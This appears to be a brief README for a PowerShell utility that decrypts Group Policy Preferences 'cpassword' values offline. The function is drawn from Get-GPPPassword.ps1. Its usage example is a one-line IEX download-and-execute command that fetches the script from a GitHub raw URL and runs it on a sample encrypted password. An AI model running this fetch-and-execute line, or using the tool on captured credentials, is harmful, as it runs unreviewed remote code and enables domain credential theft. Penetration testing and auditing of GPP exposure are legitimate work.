# DecryptedCpassword
This is the the  decryption function Get-DecryptedCPassword of the the script Get-GPPPassword.ps1.
Useful if we want decrypt offline the password extracted from a GPP

# Example of usage
IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/DenFox93/DecryptedCpassword/main/Get-DecryptedCpassword.ps1'); Get-DecryptedCpassword -Cpassword "VPe/o9YRyz2cksnYRbNeQpxQIjMB/W4+CjQJosyeQls"
